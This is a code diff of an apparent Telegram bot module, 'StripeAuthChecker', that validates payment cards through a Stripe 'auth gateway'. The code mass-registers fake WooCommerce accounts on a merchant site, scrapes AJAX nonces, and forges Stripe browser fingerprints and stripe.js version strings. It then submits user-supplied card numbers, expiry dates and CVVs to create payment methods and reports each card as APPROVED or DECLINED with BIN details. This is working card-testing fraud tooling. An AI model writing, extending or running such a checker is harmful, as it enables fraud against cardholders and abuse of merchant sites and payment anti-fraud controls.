-                    add_payment_url = f"{self.base_url}/my-account/add-payment-method/"
+            headers = self.get_base_headers()
+            headers['Referer'] = f"{self.base_url}/my-account-2/"
 
-                    headers = self.get_base_headers()
-                    headers['Referer'] = f"{self.base_url}/my-account/"
+            payment_response = await client.get(payment_url, headers=headers)
 
-                    async with session.get(add_payment_url, headers=headers, timeout=20) as add_response:
-                        if add_response.status != 200:
-                            logger.error(f"Add payment page failed: {add_response.status}")
-                            return None, None, f"Add payment page failed: {add_response.status}"
+            if payment_response.status_code != 200:
+                logger.error(f"Payment page failed: {payment_response.status_code}")
+                await client.aclose()
+                return None, None, f"Payment page failed: {payment_response.status_code}"
 
-                        add_payment_text = await add_response.text()
+            response_text = payment_response.text
 
-                        # Step 6: Extract AJAX nonce
-                        logger.step(6, 6, "Extracting AJAX nonce...")
+            # Extract AJAX nonce
+            nonce_patterns = [
+                r'"createAndConfirmSetupIntentNonce":"([a-f0-9]{8,12})"',
+                r'"_ajax_nonce":"([a-f0-9]{8,12})"',
+                r'name="_ajax_nonce" value="([a-f0-9]{8,12})"',
+                r'nonce["\']?[^>]*value=["\']([a-f0-9]{8,12})["\']',
+                r'stripe_nonce["\']?[^>]*value=["\']([a-f0-9]{8,12})["\']'
+            ]
 
-                        ajax_nonce = None
-                        ajax_patterns = [
-                            r'name=["\']_ajax_nonce["\'][^>]*value=["\']([a-fA-F0-9]{8,12})["\']',
-                            r'"_ajax_nonce"\s*:\s*"([a-fA-F0-9]{8,12})"',
-                            r'createAndConfirmSetupIntentNonce["\']?\s*[:=]\s*["\']([a-fA-F0-9]{8,12})["\']',
-                        ]
+            nonce = None
+            for pattern in nonce_patterns:
+                nonce_match = re.search(pattern, response_text, re.IGNORECASE)
+                if nonce_match:
+                    nonce = nonce_match.group(1)
+                    logger.success(f"Found AJAX nonce: {nonce}")
+                    break
 
-                        for i, pattern in enumerate(ajax_patterns):
-                            match = re.search(pattern, add_payment_text, re.IGNORECASE)
-                            if match:
-                                ajax_nonce = match.group(1)
-                                logger.success(f"Found AJAX nonce using pattern {i+1}: {ajax_nonce}")
-                                break
+            if not nonce:
+                logger.error("AJAX nonce not found")
+                await client.aclose()
+                return None, None, "Nonce token not found"
 
-                        if not ajax_nonce:
-                            # Look for any nonce in JavaScript
-                            js_pattern = r'nonce\s*[=:]\s*["\']([a-fA-F0-9]{8,12})["\']'
-                            match = re.search(js_pattern, add_payment_text, re.IGNORECASE)
-                            if match:
-                                ajax_nonce = match.group(1)
-                                logger.success(f"Found AJAX nonce in JavaScript: {ajax_nonce}")
-
-                        if not ajax_nonce:
-                            logger.error("AJAX nonce not found")
-                            return None, None, "AJAX nonce not found"
-
-                        logger.success("Session creation completed successfully")
-                        # Return session and nonce (we'll keep session open for later use)
-                        return session, ajax_nonce, "Success"
-
-            except asyncio.TimeoutError:
-                logger.error("Account page timeout")
-                return None, None, "Account page timeout"
-            except Exception as e:
-                logger.error(f"Account page error: {str(e)}")
-                return None, None, f"Account page error: {str(e)}"
+            logger.success("Session creation completed")
+            return client, nonce, "Success"
 
         except Exception as e:
             logger.error(f"Session creation failed: {str(e)}")
-            if session:
-                await session.close()
-            if connector:
-                await connector.close()
+            try:
+                if client:
+                    await client.aclose()
+            except:
+                pass
             return None, None, f"Session creation failed: {str(e)}"
 
-    async def attempt_registration(self, session, nonce, html_content):
-        """Attempt user registration with given nonce"""
+    async def register_new_user(self, client, reg_nonce, previous_response=None):
         try:
-            # Generate random user credentials
-            random_id = random.randint(1000, 9999)
+            # Generate realistic user details
+            random_id = random.randint(100000, 999999)
             first_names = ["John", "Jane", "Robert", "Mary", "David", "Sarah", "Michael", "Lisa", "James", "Emma"]
             last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
 
             first_name = random.choice(first_names)
             last_name = random.choice(last_names)
-            username = f"{first_name.lower()}{last_name.lower()}{random_id}"
+            username = f"{first_name.lower()}{last_name.lower()}{random.randint(10, 99)}"
 
-            domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "icloud.com"]
+            domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "icloud.com", "protonmail.com"]
             domain = random.choice(domains)
             email = f"{username}@{domain}"
 
-            password = f"{first_name}{random.randint(100, 999)}@{random.randint(0, 9)}"
+            # Generate strong password
+            password = f"{first_name}{random.randint(1000, 9999)}!{random.choice(['@', '#', '$', '&'])}"
 
-            reg_url = f"{self.base_url}/my-account/"
+            reg_url = f"{self.base_url}/my-account-2/"
 
-            # Extract _wp_http_referer
-            wp_http_referer = "/my-account/"
-            wp_referer_match = re.search(r'name=["\']_wp_http_referer["\'][^>]*value=["\']([^"\']+)["\']', html_content)
-            if wp_referer_match:
-                wp_http_referer = wp_referer_match.group(1)
+            # Try to extract wp_http_referer from previous response
+            wp_http_referer = "/my-account-2/"
+            if previous_response:
+                wp_referer_match = re.search(r'name="_wp_http_referer"[^>]*value="([^"]*)"', previous_response.text)
+                if wp_referer_match:
+                    wp_http_referer = wp_referer_match.group(1)
 
-            # Get current time
+            # Prepare registration data
             current_time = datetime.now()
             session_start = current_time.replace(second=random.randint(0, 59))
 
-            # Registration data
             reg_data = {
+                'username': username,
                 'email': email,
                 'password': password,
+                'mailchimp_woocommerce_newsletter': '1',
                 'wc_order_attribution_source_type': 'typein',
                 'wc_order_attribution_referrer': '(none)',
                 'wc_order_attribution_utm_campaign': '(none)',
@@ -943,8 +699,8 @@ class StripeAuth2Checker:
                 'wc_order_attribution_session_pages': str(random.randint(1, 3)),
                 'wc_order_attribution_session_count': '1',
                 'wc_order_attribution_user_agent': self.user_agent,
+                'woocommerce-register-nonce': reg_nonce,
                 '_wp_http_referer': wp_http_referer,
-                'woocommerce-register-nonce': nonce,
                 'register': 'Register'
             }
 
@@ -953,126 +709,110 @@ class StripeAuth2Checker:
                 'Content-Type': 'application/x-www-form-urlencoded',
                 'Origin': self.base_url,
                 'Referer': reg_url,
+                'Cache-Control': 'max-age=0',
+                'Upgrade-Insecure-Requests': '1'
             })
 
-            async with session.post(reg_url, data=reg_data, headers=headers, allow_redirects=True, timeout=30) as response:
-                response_text = await response.text()
+            # POST registration request
+            response = await client.post(reg_url, data=reg_data, headers=headers, follow_redirects=True)
 
-                # Check for success indicators
-                success_indicators = [
-                    'my-account',
-                    'dashboard',
-                    'logout',
-                    'log out',
-                    'welcome',
-                    'hello',
-                    'account details',
-                ]
+            # Check for success indicators
+            response_text = response.text.lower()
+            response_cookies = str(response.cookies).lower()
 
-                # Check status code
-                if response.status in [200, 302]:
-                    # Check for redirect
-                    if response.status == 302:
-                        location = response.headers.get('location', '')
-                        if location and '/my-account/' in location:
-                            logger.success("Registration successful (302 redirect)")
-                            return True
+            success_indicators = [
+                'wordpress_logged_in',
+                'woocommerce_items_in_cart',
+                'registration complete',
+                'my account',
+                'dashboard',
+                'log out',
+                'logout',
+                'welcome,',
+                'hello,',
+                'your account'
+            ]
 
-                    # Check response content
-                    response_lower = response_text.lower()
-                    for indicator in success_indicators:
-                        if indicator in response_lower:
-                            logger.success(f"Registration successful (found: {indicator})")
-                            return True
+            success_found = False
+            for indicator in success_indicators:
+                if indicator in response_text or indicator in response_cookies:
+                    success_found = True
+                    break
 
-                    # Check URL
-                    response_url = str(response.url)
-                    if '/my-account/' in response_url:
-                        logger.success("Registration successful (my-account URL)")
+            if (response.status_code in [200, 302]) and success_found:
+                return True
+            else:
+                # Try alternative: maybe username field is not needed
+                try:
+                    del reg_data['username']
+                    response2 = await client.post(reg_url, data=reg_data, headers=headers, follow_redirects=True)
+
+                    if response2.status_code in [200, 302]:
                         return True
+                except:
+                    pass
 
-                logger.warning(f"Registration may have failed. Status: {response.status}")
                 return False
 
         except Exception as e:
-            logger.error(f"Registration attempt failed: {str(e)}")
             return False
 
     async def check_card(self, card_details, username, user_data):
         start_time = time.time()
         cc, mes, ano, cvv = "", "", "", ""
-        session = None
-        connector = None
+        client = None
 
         try:
-            # Use SmartCardParser to extract card details from ANY format
-            logger.parsing(f"Input received: {card_details[:100]}...")
-            cc, mes, ano, cvv = SmartCardParser.extract_card_from_text(card_details)
+            logger.info(f"🔍 Starting Stripe Auth check: {card_details[:12]}XXXX{card_details[-4:] if len(card_details) > 4 else ''}")
 
-            if not cc:
-                # Try to parse as direct input if parser fails
-                parts = card_details.split()
-                if len(parts) >= 1:
-                    # Take the first part that looks like a card
-                    for part in parts:
-                        cc_match = re.search(r'(\d{15,19})', part)
-                        if cc_match:
-                            cc = cc_match.group(1)
-                            # Try to find other components
-                            mes_match = re.search(r'(\d{1,2})', card_details[card_details.find(cc)+len(cc):])
-                            if mes_match:
-                                mes = mes_match.group(1)
-                            year_match = re.search(r'(20\d{2}|\d{2})', card_details)
-                            if year_match:
-                                ano = year_match.group(1)
-                                if len(ano) == 2:
-                                    ano = '20' + ano
-                            cvv_match = re.search(r'(\d{3,4})', card_details)
-                            if cvv_match:
-                                cvv = cvv_match.group(1)
-                            break
+            cc_parts = card_details.split('|')
+            if len(cc_parts) < 4:
+                return await self.format_response("", "", "", "", "ERROR", "Invalid card format. Use: CC|MM|YY|CVV", username, time.time()-start_time, user_data)
 
-            if not cc:
-                elapsed = time.time() - start_time
-                return await self.format_response("", "", "", "", "ERROR", "No valid card number found in your message", username, elapsed, user_data)
+            cc = cc_parts[0].strip().replace(" ", "")
+            mes = cc_parts[1].strip()
+            ano = cc_parts[2].strip()
+            cvv = cc_parts[3].strip()
 
             # Validate card details
-            is_valid, validation_msg = SmartCardParser.validate_card_details(cc, mes, ano, cvv)
-            if not is_valid:
-                elapsed = time.time() - start_time
-                return await self.format_response(cc, mes, ano, cvv, "ERROR", validation_msg, username, elapsed, user_data)
+            if not cc.isdigit() or len(cc) < 15:
+                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid card number", username, time.time()-start_time, user_data)
 
-            logger.info(f"🔍 Starting Stripe Auth 2 check: {cc[:6]}XXXXXX{cc[-4:]}|{mes}|{ano}|{cvv}")
+            if not mes.isdigit() or len(mes) not in [1, 2] or not (1 <= int(mes) <= 12):
+                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid month", username, time.time()-start_time, user_data)
 
-            # Get BIN info
+            if not ano.isdigit() or len(ano) not in [2, 4]:
+                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid year", username, time.time()-start_time, user_data)
+
+            if not cvv.isdigit() or len(cvv) not in [3, 4]:
+                return await self.format_response(cc, mes, ano, cvv, "ERROR", "Invalid CVV", username, time.time()-start_time, user_data)
+
+            if len(ano) == 2:
+                ano = '20' + ano
+
+            # Get BIN info with proper flag handling
             bin_info = await self.get_bin_info(cc)
             logger.bin_info(f"BIN: {cc[:6]} | {bin_info['scheme']} - {bin_info['type']} | {bin_info['bank']} | {bin_info['country']} [{bin_info['emoji']}]")
 
-            # Create authenticated session with retry logic
-            max_attempts = 3
-            session, nonce, session_msg = None, None, ""
+            # Create authenticated session
+            max_attempts = 2
+            client, nonce, session_msg = None, None, ""
 
             for attempt in range(max_attempts):
                 logger.network(f"Session creation attempt {attempt + 1}/{max_attempts}")
-                try:
-                    session, nonce, session_msg = await self.create_authenticated_session()
-                    if nonce:
-                        break
-                except Exception as e:
-                    logger.warning(f"Session attempt {attempt + 1} failed: {str(e)}")
-                
+                client, nonce, session_msg = await self.create_authenticated_session()
+                if nonce:
+                    break
                 if attempt < max_attempts - 1:
-                    wait_time = random.uniform(5.0, 8.0)  # Increased wait time
-                    logger.warning(f"Session failed, waiting {wait_time:.1f}s before retry...")
-                    await asyncio.sleep(wait_time)
+                    await asyncio.sleep(random.uniform(2.0, 4.0))
 
             if not nonce:
-                elapsed = time.time() - start_time
-                return await self.format_response(cc, mes, ano, cvv, "ERROR", f"Session failed: {session_msg}", username, elapsed, user_data, bin_info)
+                return await self.format_response(cc, mes, ano, cvv, "ERROR", f"Session failed: {session_msg}", username, time.time()-start_time, user_data, bin_info)
 
             # Create Stripe payment method
-            logger.step(5, 6, "Creating Stripe payment method...")
+            logger.step(4, 6, "Creating Stripe payment method...")
 
+            # Generate realistic browser fingerprints for Stripe
             client_session_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=36))
             guid = ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)) + ''.join(random.choices(string.digits, k=5))
             muid = ''.join(random.choices(string.ascii_lowercase + string.digits, k=32)) + ''.join(random.choices(string.digits, k=5))
@@ -1080,12 +820,9 @@ class StripeAuth2Checker:
 
             postal_code = random.choice(['10080', '90210', '33101', '60601', '75201', '94102', '98101', '20001'])
 
-            # Format card number with spaces as shown in trace
-            formatted_cc = f"{cc[:4]} {cc[4:8]} {cc[8:12]} {cc[12:]}"
-
             stripe_data = {
                 'type': 'card',
-                'card[number]': formatted_cc,
+                'card[number]': cc,
                 'card[cvc]': cvv,
                 'card[exp_year]': ano,
                 'card[exp_month]': mes,
@@ -1093,7 +830,7 @@ class StripeAuth2Checker:
                 'billing_details[address][postal_code]': postal_code,
                 'billing_details[address][country]': 'US',
                 'pasted_fields': 'number',
-                'payment_user_agent': f'stripe.js/065b474d33; stripe-js-v3/065b474d33; payment-element; deferred-intent',
+                'payment_user_agent': f'stripe.js/{random.choice(["065b474d33", "8e9b241db6", "a1b2c3d4e5"])}; stripe-js-v3/{random.choice(["065b474d33", "8e9b241db6", "a1b2c3d4e5"])}; payment-element; deferred-intent',
                 'referrer': self.base_url,
                 'time_on_page': str(random.randint(30000, 120000)),
                 'client_attribution_metadata[client_session_id]': client_session_id,
@@ -1121,160 +858,142 @@ class StripeAuth2Checker:
                 'user-agent': self.user_agent,
                 'sec-ch-ua': self.sec_ch_ua,
                 'sec-ch-ua-mobile': self.sec_ch_ua_mobile,
-                'sec-ch-ua-platform': self.sec_ch_ua_platform,
+                'sec-ch-ua-platform': self.sec_ch_ua_platform
             }
 
             logger.stripe("Sending request to Stripe API...")
             await asyncio.sleep(random.uniform(0.5, 1.5))
 
-            # Use a separate session for Stripe API with VPS-optimized settings
-            ssl_context = self.create_ssl_context()
-            stripe_connector = aiohttp.TCPConnector(ssl=ssl_context, limit=10)
-            stripe_timeout = aiohttp.ClientTimeout(total=45, connect=15, sock_read=30)
-            
-            async with aiohttp.ClientSession(connector=stripe_connector, timeout=stripe_timeout) as stripe_session:
-                async with stripe_session.post(
-                    "https://api.stripe.com/v1/payment_methods",
-                    headers=stripe_headers,
-                    data=stripe_data,
-                    timeout=45
-                ) as stripe_response:
-                    if stripe_response.status != 200:
-                        error_text = await stripe_response.text()
-                        error_text = error_text[:150] if error_text else "No response"
-                        logger.error(f"Stripe API error: {error_text}")
-                        await session.close()
-                        elapsed = time.time() - start_time
-                        return await self.format_response(cc, mes, ano, cvv, "DECLINED", f"Stripe Error: {error_text}", username, elapsed, user_data, bin_info)
+            stripe_response = await client.post("https://api.stripe.com/v1/payment_methods", 
+                                               headers=stripe_headers, data=stripe_data)
 
-                    stripe_json = await stripe_response.json()
-                    logger.debug_response(f"Stripe Response: {stripe_response.status} - {json.dumps(stripe_json, indent=2)[:300]}...")
+            logger.debug_response(f"Stripe API Response: {stripe_response.status_code}")
 
-                    if "error" in stripe_json:
-                        error_msg = stripe_json["error"].get("message", "Stripe declined")
-                        logger.error(f"Stripe error message: {error_msg}")
-                        await session.close()
-                        elapsed = time.time() - start_time
-                        return await self.format_response(cc, mes, ano, cvv, "DECLINED", error_msg, username, elapsed, user_data, bin_info)
+            if stripe_response.status_code != 200:
+                error_text = stripe_response.text[:150] if stripe_response.text else "No response"
+                logger.error(f"Stripe API error: {error_text}")
+                await client.aclose()
+                return await self.format_response(cc, mes, ano, cvv, "DECLINED", f"Stripe Error: {error_text}", username, time.time()-start_time, user_data, bin_info)
 
-                    payment_method_id = stripe_json.get("id")
-                    if not payment_method_id:
-                        logger.error("No payment method ID in Stripe response")
-                        await session.close()
-                        elapsed = time.time() - start_time
-                        return await self.format_response(cc, mes, ano, cvv, "DECLINED", "Payment method creation failed", username, elapsed, user_data, bin_info)
+            stripe_json = stripe_response.json()
+            logger.debug_response(f"Stripe Response: {stripe_response.status_code} - {json.dumps(stripe_json, indent=2)[:300]}...")
 
-                    logger.success(f"Payment method created: {payment_method_id}")
+            if "error" in stripe_json:
+                error_msg = stripe_json["error"].get("message", "Stripe declined")
+                logger.error(f"Stripe error message: {error_msg}")
+                await client.aclose()
+                return await self.format_response(cc, mes, ano, cvv, "DECLINED", error_msg, username, time.time()-start_time, user_data, bin_info)
 
-                    # Confirm setup intent with website
-                    logger.step(6, 6, "Confirming setup intent...")
-                    ajax_url = f"{self.base_url}/wp-admin/admin-ajax.php"
-                    ajax_headers = self.get_base_headers()
-                    ajax_headers.update({
-                        'Accept': '*/*',
-                        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-                        'Origin': self.base_url,
-                        'Referer': f"{self.base_url}/my-account/add-payment-method/",
-                        'X-Requested-With': 'XMLHttpRequest',
-                    })
+            payment_method_id = stripe_json.get("id")
+            if not payment_method_id:
+                logger.error("No payment method ID in Stripe response")
+                await client.aclose()
+                return await self.format_response(cc, mes, ano, cvv, "DECLINED", "Payment method creation failed", username, time.time()-start_time, user_data, bin_info)
 
-                    ajax_data = {
-                        'action': 'wc_stripe_create_and_confirm_setup_intent',
-                        'wc-stripe-payment-method': payment_method_id,
-                        'wc-stripe-payment-type': 'card',
-                        '_ajax_nonce': nonce
-                    }
+            logger.success(f"Payment method created: {payment_method_id}")
 
-                    await asyncio.sleep(random.uniform(0.3, 0.8))
+            # Confirm setup intent with website
+            logger.step(5, 6, "Confirming setup intent...")
+            ajax_url = f"{self.base_url}/wp-admin/admin-ajax.php"
+            ajax_headers = self.get_base_headers()
+            ajax_headers.update({
+                'Accept': 'application/json, text/javascript, */*; q=0.01',
+                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                'Origin': self.base_url,
+                'Referer': f"{self.base_url}/my-account-2/add-payment-method/",
+                'X-Requested-With': 'XMLHttpRequest',
+                'Sec-Fetch-Dest': 'empty',
+                'Sec-Fetch-Mode': 'cors',
+                'Sec-Fetch-Site': 'same-origin'
+            })
 
-                    async with session.post(ajax_url, headers=ajax_headers, data=ajax_data, timeout=30) as ajax_response:
-                        await session.close()
+            ajax_data = {
+                'action': 'wc_stripe_create_and_confirm_setup_intent',
+                'wc-stripe-payment-method': payment_method_id,
+                'wc-stripe-payment-type': 'card',
+                '_ajax_nonce': nonce
+            }
 
-                        if ajax_response.status != 200:
-                            error_detail = "Bad Request"
-                            try:
-                                error_json = await ajax_response.json()
-                                if isinstance(error_json, dict):
-                                    if 'data' in error_json and 'message' in error_json['data']:
-                                        error_detail = error_json['data']['message']
-                            except:
-                                pass
+            await asyncio.sleep(random.uniform(0.3, 0.8))
 
-                            logger.error(f"AJAX error: {error_detail}")
-                            elapsed = time.time() - start_time
-                            return await self.format_response(cc, mes, ano, cvv, "DECLINED", f"AJAX Error: {error_detail}", username, elapsed, user_data, bin_info)
+            ajax_response = await client.post(ajax_url, headers=ajax_headers, data=ajax_data)
+            logger.debug_response(f"AJAX Response: {ajax_response.status_code}")
 
-                        try:
-                            result = await ajax_response.json()
-                            logger.debug_response(f"AJAX Response: {json.dumps(result, indent=2)}")
+            await client.aclose()
 
-                            logger.step(6, 6, "Analyzing result...")
-                            elapsed = time.time() - start_time
+            if ajax_response.status_code != 200:
+                error_detail = "Bad Request"
+                try:
+                    error_json = ajax_response.json()
+                    if isinstance(error_json, dict):
+                        if 'data' in error_json and 'message' in error_json['data']:
+                            error_detail = error_json['data']['message']
+                except:
+                    pass
 
-                            if result.get("success"):
-                                logger.success("Card APPROVED")
+                logger.error(f"AJAX error: {error_detail}")
+                return await self.format_response(cc, mes, ano, cvv, "DECLINED", f"AJAX Error: {error_detail}", username, time.time()-start_time, user_data, bin_info)
 
-                                if (isinstance(result.get("data"), dict) and 
-                                    result["data"].get("status") == "requires_action" and
-                                    result["data"].get("next_action", {}).get("type") == "use_stripe_sdk" and
-                                    "three_d_secure_2_source" in result["data"].get("next_action", {}).get("use_stripe_sdk", {})):
+            try:
+                result = ajax_response.json()
+                logger.debug_response(f"AJAX Response: {json.dumps(result, indent=2)}")
 
-                                    return await self.format_response(cc, mes, ano, cvv, "APPROVED", "**Stripe_3ds_Fingerprint**", username, elapsed, user_data, bin_info)
+                logger.step(6, 6, "Analyzing result...")
 
-                                return await self.format_response(cc, mes, ano, cvv, "APPROVED", "Successful", username, elapsed, user_data, bin_info)
+                if result.get("success"):
+                    logger.success("Card APPROVED")
+
+                    if (isinstance(result.get("data"), dict) and 
+                        result["data"].get("status") == "requires_action" and
+                        result["data"].get("next_action", {}).get("type") == "use_stripe_sdk" and
+                        "three_d_secure_2_source" in result["data"].get("next_action", {}).get("use_stripe_sdk", {})):
+
+                        return await self.format_response(cc, mes, ano, cvv, "APPROVED", "**Stripe_3ds_Fingerprint**", username, time.time()-start_time, user_data, bin_info)
+
+                    return await self.format_response(cc, mes, ano, cvv, "APPROVED", "Successful", username, time.time()-start_time, user_data, bin_info)
+                else:
+                    error_data = result.get("data", {})
+                    error_message = "Transaction Declined"
+
+                    if isinstance(error_data, dict):
+                        if "error" in error_data:
+                            error_obj = error_data["error"]
+                            if isinstance(error_obj, dict):
+                                error_message = error_obj.get("message", "Card Declined")
                             else:
-                                error_data = result.get("data", {})
-                                error_message = "Transaction Declined"
+                                error_message = str(error_obj)
+                        elif "message" in error_data:
+                            error_message = error_data["message"]
+                    elif isinstance(error_data, str):
+                        error_message = error_data
 
-                                if isinstance(error_data, dict):
-                                    if "error" in error_data:
-                                        error_obj = error_data["error"]
-                                        if isinstance(error_obj, dict):
-                                            error_message = error_obj.get("message", "Card Declined")
-                                        else:
-                                            error_message = str(error_obj)
-                                    elif "message" in error_data:
-                                        error_message = error_data["message"]
-                                elif isinstance(error_data, str):
-                                    error_message = error_data
+                    logger.warning(f"Card DECLINED: {error_message}")
+                    return await self.format_response(cc, mes, ano, cvv, "DECLINED", error_message, username, time.time()-start_time, user_data, bin_info)
 
-                                logger.warning(f"Card DECLINED: {error_message}")
-                                return await self.format_response(cc, mes, ano, cvv, "DECLINED", error_message, username, elapsed, user_data, bin_info)
+            except json.JSONDecodeError as e:
+                logger.error(f"JSON decode error: {str(e)}")
+                return await self.format_response(cc, mes, ano, cvv, "DECLINED", "Invalid server response", username, time.time()-start_time, user_data, bin_info)
 
-                        except json.JSONDecodeError as e:
-                            logger.error(f"JSON decode error: {str(e)}")
-                            elapsed = time.time() - start_time
-                            return await self.format_response(cc, mes, ano, cvv, "DECLINED", "Invalid server response", username, elapsed, user_data, bin_info)
-
-        except asyncio.TimeoutError:
+        except httpx.TimeoutException:
             logger.error("Request timeout")
-            if session:
-                await session.close()
-            elapsed = time.time() - start_time
-            return await self.format_response(cc, mes, ano, cvv, "ERROR", "Request timeout", username, elapsed, user_data, bin_info)
-        except aiohttp.ClientConnectorError as e:
-            logger.error(f"Connection error: {str(e)}")
-            if session:
-                await session.close()
-            elapsed = time.time() - start_time
-            return await self.format_response(cc, mes, ano, cvv, "ERROR", f"Connection failed: {str(e)[:50]}", username, elapsed, user_data, bin_info)
-        except aiohttp.ServerDisconnectedError:
-            logger.error("Server disconnected")
-            if session:
-                await session.close()
-            elapsed = time.time() - start_time
-            return await self.format_response(cc, mes, ano, cvv, "ERROR", "Server disconnected", username, elapsed, user_data, bin_info)
+            if client:
+                await client.aclose()
+            return await self.format_response(cc, mes, ano, cvv, "ERROR", "Request timeout", username, time.time()-start_time, user_data, bin_info)
+        except httpx.ConnectError:
+            logger.error("Connection error")
+            if client:
+                await client.aclose()
+            return await self.format_response(cc, mes, ano, cvv, "ERROR", "Connection failed", username, time.time()-start_time, user_data, bin_info)
         except Exception as e:
             logger.error(f"Unexpected error: {str(e)}")
-            if session:
-                await session.close()
-            elapsed = time.time() - start_time
-            return await self.format_response(cc, mes, ano, cvv, "ERROR", f"System error: {str(e)[:80]}", username, elapsed, user_data, bin_info)
+            if client:
+                await client.aclose()
+            return await self.format_response(cc, mes, ano, cvv, "ERROR", f"System error: {str(e)[:80]}", username, time.time()-start_time, user_data, bin_info)
 
-# Command handler for /chk command
-@Client.on_message(filters.command(["chk", ".chk", "$chk"]))
+# Command handler
+@Client.on_message(filters.command(["au", ".au", "$au"]))
 @auth_and_free_restricted
-async def handle_stripe_auth2(client: Client, message: Message):
+async def handle_stripe_auth(client: Client, message: Message):
     try:
         user_id = message.from_user.id
         username = message.from_user.username or str(user_id)
@@ -1284,8 +1003,8 @@ async def handle_stripe_auth2(client: Client, message: Message):
         from BOT.helper.Admins import is_command_disabled, get_command_offline_message
 
         # Get the actual command that was used
-        command_text = message.text.split()[0]  # Get /chk or .chk or $chk
-        command_name = command_text.lstrip('/.$')  # Extract just 'chk'
+        command_text = message.text.split()[0]  # Get /au or .au or $au
+        command_name = command_text.lstrip('/.$')  # Extract just 'au'
 
         # Check if command is disabled
         if is_command_disabled(command_name):
@@ -1315,7 +1034,7 @@ async def handle_stripe_auth2(client: Client, message: Message):
         plan_name = user_plan.get("plan", "Free")
 
         # Check cooldown (owner is automatically skipped in check_cooldown function)
-        can_use, wait_time = check_cooldown(user_id, "chk")
+        can_use, wait_time = check_cooldown(user_id, "au")
         if not can_use:
             await message.reply(f"""<pre>⏳ Cooldown Active</pre>
 ━━━━━━━━━━━━━
@@ -1328,66 +1047,35 @@ async def handle_stripe_auth2(client: Client, message: Message):
         # NO CREDIT DEDUCTION FOR ANY USER - This gate is FREE
         # REMOVED: update_user_credits(user_id) call completely
 
-        # Get the full message text
-        full_text = message.text.strip()
-
-        # Remove command part to get just the card details
-        command_pattern = r'^/(chk|\.chk|\$chk)\s*'
-        card_details = re.sub(command_pattern, '', full_text, flags=re.IGNORECASE)
-
-        if not card_details.strip():
-            # If no card details provided, check if there's a replied message
-            if message.reply_to_message and message.reply_to_message.text:
-                card_details = message.reply_to_message.text
-            else:
-                await message.reply("""<pre>#WAYNE ─[STRIPE AUTH 2]─</pre>
+        args = message.text.split()
+        if len(args) < 2:
+            await message.reply("""<pre>#WAYNE ─[STRIPE AUTH]─</pre>
 ━━━━━━━━━━━━━
-⟐ <b>Command</b>: <code>/chk</code> or <code>.chk</code> or <code>$chk</code>
-⟐ <b>Usage</b>: Send card in ANY format after command
-⟐ <b>Examples:</b>
-<code>/chk 4111111111111111|12|2025|123</code>
-<code>/chk 4355460265778976|01/2028|221</code>
-<code>/chk 4232230283582877
-06/28
-473
-VISA
-DEBIT</code>
-<code>Reply to a message containing card details with /chk</code>
+⟐ <b>Command</b>: <code>/au</code> or <code>.au</code> or <code>$au</code>
+⟐ <b>Usage</b>: <code>/au cc|mm|yy|cvv</code>
+⟐ <b>Example</b>: <code>/au 4111111111111111|12|2025|123</code>
 ━━━━━━━━━━━━━
-<b>~ Note:</b> <code>Smart parser detects cards in ANY format</code>""")
-                return
+<b>~ Note:</b> <code>Checks card via Stripe Auth gateway</code>""")
+            return
 
-        logger.info(f"User @{username} sent: {card_details[:100]}...")
+        card_details = args[1].strip()
 
-        # Try to parse card details
-        cc, mes, ano, cvv = SmartCardParser.extract_card_from_text(card_details)
-
-        if not cc or not mes or not ano or not cvv:
-            # Show what we tried to parse
-            await message.reply(f"""<pre>❌ Card Parsing Failed</pre>
+        cc_parts = card_details.split('|')
+        if len(cc_parts) < 4:
+            await message.reply("""<pre>❌ Invalid Format</pre>
 ━━━━━━━━━━━━━
-⟐ <b>Message</b>: Could not extract valid card details from your message.
-⟐ <b>Input Received:</b> <code>{card_details[:100]}...</code>
-⟐ <b>Try These Formats:</b>
-1. <code>4111111111111111|12|2025|123</code>
-2. <code>4355460265778976|01/2028|221</code>
-3. <code>Card: 4232230283582877
-Exp: 06/28
-CVV: 473</code>
+⟐ <b>Message</b>: Invalid card format.
+⟐ <b>Correct Format</b>: <code>cc|mm|yy|cvv</code>
+⟐ <b>Example</b>: <code>4111111111111111|12|2025|123</code>
 ━━━━━━━━━━━━━""")
             return
 
-        # Validate card details
-        is_valid, validation_msg = SmartCardParser.validate_card_details(cc, mes, ano, cvv)
-        if not is_valid:
-            await message.reply(f"""<pre>❌ Card Validation Failed</pre>
-━━━━━━━━━━━━━
-⟐ <b>Message</b>: {validation_msg}
-⟐ <b>Parsed:</b> <code>{cc[:6]}XXXXXX{cc[-4:]}|{mes}|{ano}|{cvv}</code>
-━━━━━━━━━━━━━""")
-            return
+        cc = cc_parts[0]
+        mes = cc_parts[1]
+        ano = cc_parts[2]
+        cvv = cc_parts[3]
 
-        checker = StripeAuth2Checker()
+        checker = StripeAuthChecker()
         processing_msg = await message.reply(
             checker.get_processing_message(cc, mes, ano, cvv, username, plan_name)
         )
@@ -1398,12 +1086,9 @@ CVV: 473</code>
 
     except Exception as e:
         error_msg = str(e)[:150]
-        logger.error(f"Command error: {error_msg}")
         await message.reply(f"""<pre>❌ Command Error</pre>
 ━━━━━━━━━━━━━
 ⟐ <b>Message</b>: An error occurred while processing your request.
 ⟐ <b>Error</b>: <code>{error_msg}</code>
 ⟐ <b>Contact</b>: <code>@D_A_DYY</code> for assistance.
 ━━━━━━━━━━━━━""")
-
-print("✅ Stripe Auth 2 (chk) loaded successfully!")
